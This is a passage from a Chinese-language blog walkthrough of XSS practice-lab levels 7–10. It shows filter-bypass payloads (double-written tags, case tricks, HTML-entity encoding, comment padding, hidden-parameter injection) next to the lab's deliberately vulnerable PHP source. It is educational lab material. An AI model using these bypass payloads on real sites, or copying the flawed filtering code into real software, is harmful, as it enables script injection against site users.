class="comment">//加属性不需要讨论，要实现逃逸就要使用&quot;闭合value,但&quot;被实例化转义，因此大小写绕过不能实现，即都没有满足1，即使满足2，也无法实现大小写绕过</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>类型：输入款类型</p>
<p>解题思路：<br>输入测试语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_24.png" class="" title="在这里插入图片描述">

<ul>
<li>script 被替换为空</li>
<li>成功逃逸</li>
<li>双引号没有别实例化转义或替换</li>
</ul>
<p>输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">scRipt</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_25.png" class="" title="在这里插入图片描述">

<ul>
<li>两次测试结果一样，那就说明有点异样了</li>
<li>说明被变量的英文字符被统一转为小写后再进行替换</li>
</ul>
<p>输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_26.png" class="" title="在这里插入图片描述">

<ul>
<li>实现逃逸</li>
<li>javascript中的script被替换为空</li>
<li>下面的 “”&gt;” 实为原有input标签的后面部分–&gt;浏览器的容错</li>
<li>href也替换为空</li>
</ul>
<blockquote>
<p>由以上的三次测试，发现闭合逃逸是可以实现的，只不过是某些标签和属性会被替换为空。</p>
</blockquote>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="*双写绕过"></a>*双写绕过</h3><p>输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">scscriptript</span>&gt;</span>alert(&quot;123&quot;);<span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span> </span><br><span class="line">&quot; oonnclick=&#x27;alert(&quot;123&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>分析双写</li>
</ul>
<p>scscriptript 第一次匹配从第三个字符开始，即sc script ript 删除后即为 script</p>
<p> 对于其他伪协议等测试不不再测试（写得太累了(&lt;!_!&gt;)）–&gt;源码分析</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level8.php?keyword=nice try!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level7&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输入框类型中需要闭合value的类型实现双写绕过的三个条件：</span></span><br><span class="line"><span class="comment">//1.在拼接value之前，变量没有被实例化转义（&quot;会被实例化转义）</span></span><br><span class="line"><span class="comment">//2.对应字符别替换为空</span></span><br><span class="line"><span class="comment">//3.在整个过程中，只实现一次替换</span></span><br><span class="line"><span class="comment">//1+2+3-&gt;双写绕过</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>输入：test</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_27.png" class="" title="在这里插入图片描述">

<ul>
<li>输入内容被拼接到超链接中-&gt;可以尝试伪协议</li>
</ul>
<p> 输入： javascript:alert(“123”)</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_28.png" class="" title="在这里插入图片描述">
<ul>
<li>javascript中的script被替换,且不是替换为空</li>
<li>括号内的第一个双引号被实例化转义</li>
</ul>
<p> （其他伪协议类型自主测试）</p>
<p>由上可知：</p>
<ul>
<li>括号内不应再使用双引号，尝试使用单引号</li>
</ul>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="*编码绕过"></a>*编码绕过</h3><p>原理：*补充知识 目录有解释</p>
<blockquote>
<p>原语句：javascript:alert(“123”)<br>unicode 编码（16进制）：</p>
<blockquote>
<p><code>&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0022&amp;#x0031&amp;#x0032&amp;#x0033&amp;#x0022&amp;#x0029 </code></p>
</blockquote>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_29.png" class="" title="在这里插入图片描述">
<p>成功绕过</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level9.php?keyword=not bad!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level8&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);  <span class="comment">//统一转为小写-&gt;防止大小写绕过</span></span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="comment">//以上为替换字符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"> <span class="comment">//添加链接使用了最为简单的方法：echo 加标签</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>查看网页源码可知,可以尝试插入伪协议</p>
<p>但是,无论输入那种伪协议，网页源码始终为：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_30.png" class="" title="在这里插入图片描述">

<p>输入:</p>
<blockquote>
<p>http:&#x2F;&#x2F;<br>至于为什么输入，全靠经验</p>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_31.png" class="" title="在这里插入图片描述">
<p>输入:</p>
<blockquote>
<p> 123http:&#x2F;&#x2F;<br> http:&#x2F;&#x2F; ashjdhj<br>以上语句都会被添加</p>
</blockquote>
<ul>
<li>所以只要识别到http:&#x2F;&#x2F;就会添加（源码分析会解释）</li>
</ul>
<h3 id="注释："><a href="#注释：" class="headerlink" title="*注释："></a>*注释：</h3><p> 现在思考如何将 http:&#x2F;&#x2F;嵌入伪协议的js代码中而不影响其执行<br> -&gt;使用注释</p>
<blockquote>
<p>&#x2F;&#x2F;  在js中为单行注释<br>&#x2F;**&#x2F; 在js中为多行注释</p>
</blockquote>
<p>尝试输入：</p>
<blockquote>
<p>javascript:alert(‘123’)&#x2F;* http:&#x2F;&#x2F; *&#x2F;<br>javascript:alert(‘123’)&#x2F;&#x2F; http:&#x2F;&#x2F; </p>
</blockquote>
<p>都可以被成功添加</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_32.png" class="" title="在这里插入图片描述">

<ul>
<li>script被替换且不为空-&gt;尝试大小写绕过</li>
</ul>
<p>输入：</p>
<blockquote>
<p>javasCript:alert(‘123’) &#x2F;<em>http:&#x2F;&#x2F;</em>&#x2F;</p>
</blockquote>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_33.png" class="" title="在这里插入图片描述">

<ul>
<li>可知变量被统一转为小写，后被替换</li>
</ul>
<p>尝试：注释+编码</p>
<p>输入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0027&amp;#x0031&amp;#x0032&amp;#x0033&amp;#x0027&amp;#x0029&amp;#x0020&amp;#x002f&amp;#x002a&amp;#x0068&amp;#x0074&amp;#x0074&amp;#x0070&amp;#x003a&amp;#x002f&amp;#x002f&amp;#x002a&amp;#x002f</span></span><br><span class="line">上述为javascript:<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;123&#x27;</span>) <span class="comment">/*http://*/</span> unicode编码的结果</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_34.png" class="" title="在这里插入图片描述">

<ul>
<li>插入失败，这是为什么呢？</li>
</ul>
<p>分析原因：</p>
<blockquote>
<p>unicode编码后的字符会被浏览器自动解码，但是服务器不会解码（指后端没有对unicode解码的代码程序），所以后端代码接受到的是一堆‘奇怪’字符，由于没有严格识别到http:&#x2F;&#x2F; ，所以不会将变量值拼拼接<br>解决措施：</p>
<blockquote>
<p>对于javascript的script中任意(不限数量)字符进行unicode编码</p>
</blockquote>
</blockquote>
<p>输入语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;<span class="comment">#x0074:alert(&#x27;123&#x27;) /*http://*/ </span></span><br><span class="line">t  -&gt; &amp;<span class="comment">#x0074</span></span><br></pre></td></tr></table></figure>
<p>成功通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level10.php?keyword=well done!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))    <span class="comment">//判断变量值是否存在字串 ‘http://’</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;  <span class="comment">//存在则直接拼接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>类型: url类型</p>
<p>解题思路：</p>
<p>输入一些测试语句（<script>alert(&#39;123&#39;);</script>）</p>
<p>但回显结果类似于：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_35.png" class="" title="在这里插入图片描述">

<ul>
<li>插入的语句被实例化，且无法准确有效地判断过滤特征或触发的行为结果–&gt;可能就不是这个参数（keyword&#x3D;）</li>
</ul>
<h3 id="隐藏标签"><a href="#隐藏标签" class="headerlink" title="*隐藏标签"></a>*隐藏标签</h3><blockquote>
<p>1.一些网站的后端可以接受隐藏的input标签的参数<br>2.隐藏input标签的目的是：后端需要input的返回值，但有不想用户看见—&gt;这种情况经常出现<br>3.hidden下的input标签的赋值往往是通过js代码的逻辑进行赋值，也存在通过post，get请求获取值</p>
</blockquote>
<ul>
<li>与前面关卡不同的是：有大量隐藏的input标签（hidden）</li>
</ul>
<p>测试使用get请求对隐藏的input标签赋值：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(%27123%27);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&amp;t_link=123&amp;t_history=456&amp;t_sort=789</span><br></pre></td></tr></table></figure>

<p>回显结果：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_36.png" class="" title="在这里插入图片描述">
<p>总共有四个键值对，探测出第四个键值对可能存在xss</p>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_37.png" class="" title="在这里插入图片描述">
<p>键值对以&amp;分割，不用担心keyword将后面的语句当作值</p>
<p>回显结果：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_38.png" class="" title="在这里插入图片描述">

<ul>
<li>回显的结果与第四关类似</li>
</ul>
<p>输入语句：（插属性）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br><span class="line">onclick 需要自主点击，所以需要’显示‘</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_39.png" class="" title="在这里插入图片描述">

<p>页面渲染：（多了一个输入文本框）</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_40.png" class="" title="在这里插入图片描述">
<p>点击即可通关</p>
<h3 id="趣事-1"><a href="#趣事-1" class="headerlink" title="*趣事"></a>*趣事</h3><p>—–&gt;有趣的是将括号里面的双引号改为单引号就无法成功插入<br>即输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&#x27;123&#x27;)&#x27; type=&#x27;text&#x27;  //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_41.png" class="" title="在这里插入图片描述">
<blockquote>
